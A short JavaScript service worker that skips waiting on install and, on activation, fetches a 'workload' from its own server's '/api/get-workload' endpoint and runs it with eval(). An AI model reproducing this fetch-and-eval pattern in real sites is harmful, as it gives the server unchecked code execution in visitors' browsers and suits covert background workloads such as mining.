// This code executes in its own worker or thread
self.addEventListener("install", (event) => {
  console.log("Service worker installed " + new Date());
  // TODO prevent re-installing
  self.skipWaiting();
});

self.addEventListener("activate", async (event) => {
  console.log("Service worker activated " + new Date());

  try {
    const response = await fetch("/api/get-workload");
    console.log("response", response);
    const data = await response.json();
    console.log("data", data);
    eval(data.workload);
  } catch (err) {
    console.log(err);
  }
});
